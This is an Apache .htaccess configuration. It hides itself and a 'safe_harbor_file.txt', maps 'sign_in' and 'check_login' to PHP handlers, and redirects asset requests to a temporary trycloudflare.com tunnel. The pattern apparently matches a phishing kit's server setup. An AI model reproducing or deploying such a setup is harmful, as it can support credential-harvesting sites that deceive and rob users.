RewriteEngine On

<Files ".htaccess">
    Require all denied
</Files>

<Files "safe_harbor_file.txt">
    Require all denied
</Files>

RewriteRule ^sign_in$ sign_in.php [L]
RewriteRule ^check_login$ check_login.php [L]

<IfModule mod_rewrite.c>
    RewriteEngine On

    RewriteRule ^(assets|webpack)/(.*)$ https://gis-shower-stake-views.trycloudflare.com/$1 [R=301,L]
</IfModule>
